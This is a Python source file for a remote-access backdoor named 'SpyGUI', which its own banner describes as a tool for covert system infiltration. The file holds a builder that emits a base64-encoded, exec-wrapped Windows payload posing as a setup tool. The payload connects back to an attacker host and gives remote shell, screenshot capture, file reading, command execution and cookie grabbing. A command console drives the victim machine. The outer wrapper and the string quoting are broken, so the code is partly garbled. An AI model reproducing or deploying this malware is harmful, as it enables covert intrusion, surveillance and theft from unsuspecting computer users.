import os
import base64

script = "print("[+] Start Checking Module...")
import os
try:                                                                                                          import random
    import pyfiglet                                                                                           from pyfiglet import Figlet
    import colorama                                                                                           from colorama import Fore
    from colorama import Style
    import socket
    import os
    import base64
    colorama.init()

except Exception as e:
    print(f"Error : {e}")
    os.system('pip3 install pyfiglet')
    os.system('pip3 install colorama')

yellow = Fore.YELLOW
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
reset = Style.RESET_ALL

lhost = "127.0.0.1"                                                                                       lport = 4444
rhost = "0.0.0.0"                                                                                         rport = 4444
file_name = "default_file"

bytes = random.randint(10000, 20000)

fonts = Figlet(font='slant')
print(blue + fonts.renderText('SpyGUI') + reset)
print(f"""
Copyright : {yellow}PhamChien{reset}
Telegram : {yellow}@anonymous_secures{reset}
                                                                                                          Description :
SpyGUI is a Python-based backdoor tool with a file format in Python, designed for covert system infiltration.

Note :
Once created, the malicious code file can only be applied to computers or windows

Command         Description
--------       -------------                                                                               help           Helping Tool
""")
while True:
    c2_input = input(f"{red}spygui{reset} > ")
    if c2_input == "lport" or c2_input == "lport ":
        lport = int(input("Set LPORT > "))                                                                        print(f"{green}[+]{reset} Set LPORT {lport} success")
                                                                                                              if c2_input == "rport" or c2_input == "rport ":
        rport = int(input("Set RPORT > "))
        print(f"{green}[+]{reset} Set RPORT {rport} success")

    if c2_input == "rhost" or c2_input == "rhost ":
        rhost = input("Set RHOST > ")
        print(f"{green}[+]{reset} Set RHOST {rhost} success")

    if c2_input == "lhost" or c2_input == "lhost ":
        lhost = input("Set LHOST > ")
        print(f"{green}[+]{reset} Set LHOST {lhost} success")

    if c2_input == "build" or c2_input == "build ":
        try:
            if not lhost:
                print(f"{red}[-]{reset} Please Set LHOST command 'lhost'...")
            elif not lport:
                print(f"{red}[-]{reset} Please Set LPORT, command 'lport'...")

            if not rhost:
                print(f"{red}[-]{reset} Please Set RHOST, command 'rhost'...")
            elif not rport:
                print(f"{red}[-]{reset} Please Set RPORT, command 'rport'...")
            else:
                file_name = input("Set File Name > ")
            payload = r"""
import os
try:
    import mss
    import sys
    import socket
    import subprocess
    import os
    import pyfiglet
    import platform
    import json
    from pyfiglet import Figlet
except:
    import os
    os.system('pip3 install mss')
    os.system('pip3 install pyfiglet')

if os.name == "nt":
    pass
else:
    print("[!] All Linux operating systems cannot use this file")
    print("[!] please run it using a computer, or windows")
    exit("[!] Denied support with Linux operating system")

fonts = Figlet(font='slant')
print(fonts.renderText('Starting Setup Tool'))
print("[+] Starting Setup...")
print("Waiting 10-15 min...")

host = "{rhost}"
port = {rport}
try:
    while True:
        settings_connect = socket.socket(
            socket.AF_INET,
            socket.SOCK_STREAM
        )
        settings_connect.connect((host, port))
        s = settings_connect
        while True:
            output = s.recv(9024)
            output_de = output.decode()
            if "sysinfo" in output_de:
                data = str(platform.uname())
                s.sendall(data.encode())

            if "shell" in output_de:
                while True:
                    op_de = s.recv(9024).decode()

                    if "exit" in op_de:
                        break

                    output_shell = subprocess.Popen(
                        op_de,
                        shell=True,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE
                    )
                    work = output_shell.stdout.read + output_shell.stderr.read()
                    s.sendall(work.encode())

            if "messenge" in output_de:
                listen_mess = s.recv(9024)
                byte_decode = listen_mess.decode()
                os.system("echo > setup.vbs")
                with open('setup.vbs', 'w') as save:
                    data = 'msgbox("' + byte_decode + '")' + "\n" + 'msgbox("' + byte_decode + '")'
                    save.write(data)
                for open_tab_mess in range(10):
                    os.system("setup.vbs")
                os.remove("setup.vbs")

            if "screenshot" in output_de:
                with mss.mss() as screenshot:
                    screenshot.shot(output='default.png')
                with open('default.png', 'rb') as noti_file:
                    data = noti_file.read()
                s.sendall(data)
                os.remove("default.png")

            if "dir" in output_de:
                path = s.recv(1024).decode()
                cmd = "dir", path
                shell_start = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                data = shell_start.stdout.read() + shell_start.stderr.read()
                s.send(data)

            if "upload" in output_de:
                read_file = s.recv(100024)
                formats = s.recv(1024).decode()
                with open("upload_123.html", 'wb') as save:
                    save.write(read_file)

            if "open" in output_de:
                file = s.recv(2024)
                file = str(file.decode())
                os.system(file)

            if "get cookie" in output_de:
                try:
                    url = s.recv(2024).decode()
                    import requests
                    def get():
                        response = requests.get(url)
                        cookie = response.cookies.get_dict()
                        cook = cookie
                        if cook:
                            json_cookie = json.dumps(cook)
                            s.send(json_cookie.encode())
                        else:
                            s.send(b"[+] Failed Get Cookie")
                    get()
                except:
                    pass

            if "pwd" in output_de:
                path = "cd"
                shell_start = subprocess.Popen(
                    path,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                p = shell_start.stdout.read() + shell_start.stderr.read()
                s.sendall(p)

            if "read file" in output_de:
                path = s.recv(9024)
                read = "type", path
                shell_start = subprocess.Popen(
                    read,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                p = shell_start.stdout.read() + shell_start.stderr.read()
                s.sendall(p)

            if "exit" in output_de:
                file_name = s.recv(2024).decode()
                file = file_name + ".py"
                os.remove(file)

            if "route" in output_de:
                read = r"C:\Windows\System32\netstat.exe"
                shell_start = subprocess.Popen(
                    read,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                p = shell_start.stdout.read() + shell_start.stderr.read()
                s.sendall(p)

            if "ipconfig" in output_de:
                read = r"C:\Windows\System32\ipconfig.exe"
                shell_start = subprocess.Popen(
                    read,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                p = shell_start.stdout.read() + shell_start.stderr.read()
                s.sendall(p)
            else:
                pass
except Exception as e:
    print(e)
    exit("[+] Setup Error")
""".format(rhost=rhost, rport=rport)
            encodes = base64.b64encode(payload.encode())
            print(f"{green}[+]{reset} Start Encode File...")
            print(f"{green}[+]{reset} Start Random Mutex..")
            print(f"{green}[+]{reset} Start Building Socket...")
            print(f"{green}[+]{reset} Start Building Json...")
            print(f"{green}[+]{reset} Start Building Handler Server...")
            print(f"{green}[+]{reset} Module Is OK")
            print(f"{green}[+]{reset} Payload : {red}\n{encodes}{reset}")
            payloads = f"""
import base64

script_de = base64.b64decode({encodes}).decode()
exec(script_de)
"""
            os.system(f'echo > ./build/{file_name}.py')
            mutex = random.randint(100, 999)
            mutex = os.system(f"echo {mutex} | md5sum")
            with open(f"./build/{file_name}.py", 'w') as builds:
                bytes = builds.write(payloads)
                print(f"{green}[+]{reset} Mutex Random : {green}{mutex}{reset}")
                print(f"{green}[+]{reset} File Name : {file_name}.py")
                print(f"{green}[+]{reset} Bytes : {bytes}")
                print(f"{green}[+]{reset} File Saved To : ./build/{file_name}.py".format(file_name=file_name))
        except Exception as e:
            print(f"{red}[-]{reset} Failed :", e)

    if c2_input == "exploit" or c2_input == "exploit " or c2_input == "run" or c2_input == "run ":
        if not file_name:
            print("Please SET FILE_NAME...")
        else:
            s = socket.socket(
                socket.AF_INET,
                socket.SOCK_STREAM
            )
            s.setsockopt(
                socket.SOL_SOCKET,
                socket.SO_REUSEADDR,
                1
            )
            s.bind((lhost, lport))
            s.listen(1)
            print("")
            print(f"{green}[+]{reset} Starting Server On Port", lport)
            print(f"{green}[+]{reset} Listen Remote Host", rhost)
            print(f"{green}[+]{reset} Tip, You can use Ngrok to buffer and publicize your Server Address")
            conn, addr = s.accept()
            print(f"{green}[+]{reset} {addr[0]}:{addr[1]} --> {lhost}:{lport} {bytes} Bytes")
            print(f"{green}[+]{reset} Starting Reverse Shell {addr[0]}:{addr[1]} --> {lhost}:{lport} {bytes} Bytes")
            print(f"{green}[+]{reset} Command 'help' for helping reverse shell")
            print("")
            try:
                while True:
                    shell_command = input(f"{addr[0]}:{addr[1]}@SpyGUI >>> ")
                    if shell_command == "help":
                        print("""
Command         Description
--------        ------------
  help           helping reverse
  screenshot     screenshot victim
  shell          start command prompt
  messenge       show messenge to victim
  sysinfo        show information computer
  route          show route address
  ipconfig       Show IP Config
  exit           exit reverse

Shell Command
--------------
  dir            show file
  upload         upload file
  read file      Reader File
  pwd            get path
  open           open file from victim
  get cookie     get cookie web server
""")
                    if shell_command == "ipconfig":
                        try:
                            conn.send(b'ipconfig')
                            output = conn.recv(9024)
                            print(f"{green}[+]{reset} Packet Success")
                            print(output.decode())
                        except:
                            print(f"{red}[-]{reset} Failed Get ipconfig")

                    if shell_command == "route":
                        try:
                            conn.send(b'route')
                            output = conn.recv(9024)
                            print(f"{green}[+]{reset} Packet Success")
                            print(output.decode())
                        except:
                            print(f"{red}[-]{reset} Failed Get Route")

                    if shell_command == "read file":
                        try:
                            conn.send(b"read file")
                            path = input("Enter Victim Path File : ")
                            conn.send(path.encode())
                            output = conn.recv(90024)
                            print(f"{green}[+]{reset} File : ", path)
                            print(output.decode())
                        except:
                            print(f"{red}[-]{reset} Read Path Failed")

                    if shell_command == "exit":
                        conn.send(b'exit')
                        conn.send(file_name.encode())
                        print(f"{green}[+]{reset} Sessions Closed")
                        break

                    if shell_command == "pwd":
                        try:
                            conn.send(b"pwd")
                            output = conn.recv(10024)
                            print(f"{green}[+]{reset} Packet Success")
                            print(f"{green}[+]{reset} PATH : {output.decode()}")
                        except:
                            print(f"{red}[-]{reset} Get Path Failed")

                    if shell_command == "get cookie":
                        try:
                            import json
                            conn.send(b"get cookie")
                            web = input("Enter website for get : ")
                            print(f"{green}[+]{reset} Packet Success")
                            conn.send(web.encode())
                            list_cook = conn.recv(9024)
                            cookie = json.loads(list_cook.decode())
                            print("+--------------------------------+")
                            print(f"\n{cookie}\n")
                            print("+--------------------------------+")
                        except:
                            print(f"{red}[-]{reset} Failed Get Cookie")

                    if shell_command == "open":
                        try:
                            conn.send(b"open")
                            file = input("Enter Your Path File Open ( ex : C:\Windows\hacked.vbs ) >> ")
                            conn.send(file.encode())
                            print(f"{green}[+]{reset} Sending Success")
                        except:
                            print(f"{red}[-]{reset} Open Failed")

                    if shell_command == "upload":
                        try:
                            path_file = input("Enter Your Path File > ")
                            with open(f"{path_file}", 'rb') as reader_doc:
                                docs = reader_doc.read(100024)
                                print(f"{green}[+]{reset} Start Upload...")
                                print(f"{green}[+]{reset} Sending To Target Success")
                                print(f"{green}[+]{reset} file : upload_123.html")
                        except:
                            print(f"{red}[-]{reset} Failed Upload")

                    if shell_command == "dir":
                        try:
                            conn.send(b"dir")
                            cmd = input("Enter Path Victims ( Default : C:\Windows\System32 ) >>> ")
                            conn.send(cmd.encode())
                            output = conn.recv(900024)
                            print(f"{green}[+]{reset} Sending Success")
                            print(f"\n{output.decode('latin-1')}\n")
                        except:
                            print(f"{red}[-]{reset} Failed Show File")

                    if shell_command == "screenshot":
                        import random
                        n = random.randint(100000, 999999)
                        try:
                            conn.send(b"screenshot")
                            os.system(f'echo "" > {addr[0]}_{n}.png')
                            with open(f'{addr[0]}_{n}.png', 'wb') as save:
                                print(f"{green}[+]{reset} CTRL + C Exit Screenshot")
                                print(f"{green}[+]{reset} Starting Fetching Image...")
                                while True:
                                    image_data = conn.recv(9024)
                                    if not image_data:
                                        break
                                    save.write(image_data)
                            print(f"{green}[+]{reset} Sending packet To Victim")
                            print(f"{green}[+]{reset} Screenshot Success")
                            print(f"{green}[+]{reset} Image Saved To : {addr[0]}_{n}.png")
                        except:
                            print(f"{green}[+]{reset} Sending packet To Victim")
                            print(f"{green}[+]{reset} Screenshot Success")
                            print(f"{green}[+]{reset} Image Saved To : {addr[0]}_{n}.png")

                    if shell_command == "shell":
                        try:
                            print("Starting Command Prompt, CMD")
                            while True:
                                shell = input("shell > ")
                                if shell == "exit":
                                    conn.send(b"exit")
                                    break
                                conn.send(shell.encode())
                                output = conn.recv(2024)
                                print(f"\n{output.decode()}")
                                pass

                        except:
                            print(f"{red}[-]{reset} Shell Error")

                    if shell_command == "messenge":
                        try:
                            conn.send(b"messenge")
                            mess = input("Enter Messeege : ")
                            conn.send(mess.encode())
                            print(f"{green}[+]{reset} Start Sending Messenge  : {mess}")
                            print(f"{green}[+]{reset}  Default Open Tab : 10")
                            print(f"{green}[+]{reset}  Sending Messenger Success")
                        except:
                            print(f"{red}[-]{reset} Show Messenge Failed")

                    if shell_command == "sysinfo":
                        try:
                            conn.send(b"sysinfo")
                            syss = conn.recv(9024)
                            d = syss.decode('latin-1')
                            print(f"{green}[+]{reset}  Sending Success")
                            unames = d.replace('uname_result', '').replace("(", "").replace(")", "")
                            uname = unames.replace("'", "").replace(",", "\n")
                            a = uname.replace('=', ' : ')
                            print("+--------------------------------+")
                            print(f"\n{a}\n")
                            print("+--------------------------------+")
                        except:
                            print(f"{red}[-]{reset} Client Not Accept, Failed Get SysInfo")

                    else:
                        pass
            except:
                print(f"{red}[-]{reset} Connect From Client Is Down")

    if c2_input == "help" or c2_input == "help ":
        print("""

Command         Description
--------       -------------
   build         Build Format File Backdoor
   generator     build shortcut Format File Backdoor
   lhost         set local host server
   lport         set local port server
   rhost         set remote host client
   rport         set remote port client
   option        show options settings

exploit
-------
   exploit       start exploit
   run           exploit shortcut

Server
------
   show inet     Show Inet

""")
    if c2_input == "option" or c2_input == "option " or c2_input == "options":
        print(f"""
Server            Description           Setting Up
------            ------------          -----------
 LHOST             Local Server Host     {lhost}
 LPORT             Local Server Port     {lport}

Client            Description           Setting Up
------            ------------          -----------
 RHOST             Remote Client Host    {rhost}
 RPORT             Remote Client Port    {rport}

Format            Description           Setting Up
------            ------------          -----------
 FILE_NAME         Format File Name      {file_name}.py
""")
    if c2_input == "show inet":
        os.system('ipconfig' if os.name == 'nt' else 'ifconfig | grep "inet"')
    if c2_input == "exit":
        print(f"{red}[-]{reset} Thanks For Using Tool")
        exit(f"{red}[-]{reset} Exit By User")
    else:
        pass"
start = base64.b64decode(script)
exec(start)
